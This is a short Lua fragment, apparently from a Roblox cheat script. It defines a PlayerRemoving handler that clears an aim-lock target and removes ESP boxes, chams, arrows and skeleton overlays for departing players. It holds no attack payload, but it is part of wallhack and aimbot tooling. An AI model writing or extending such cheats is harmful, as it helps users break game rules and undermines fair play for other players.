Players.PlayerRemoving:Connect(function(p)
    if p==locked_player then locked_player=nil end
    if espBoxes[p] then removeESPBox(espBoxes[p]); espBoxes[p]=nil end
    if chamsData[p] then restoreChams(p) end
    if arrowObjects[p] then arrowObjects[p]:Remove(); arrowObjects[p]=nil end
    if skeletonLines[p] then for _,l in pairs(skeletonLines[p]) do pcall(function() l:Remove() end) end; skeletonLines[p]=nil end
    espRayParams[p]=nil
end)

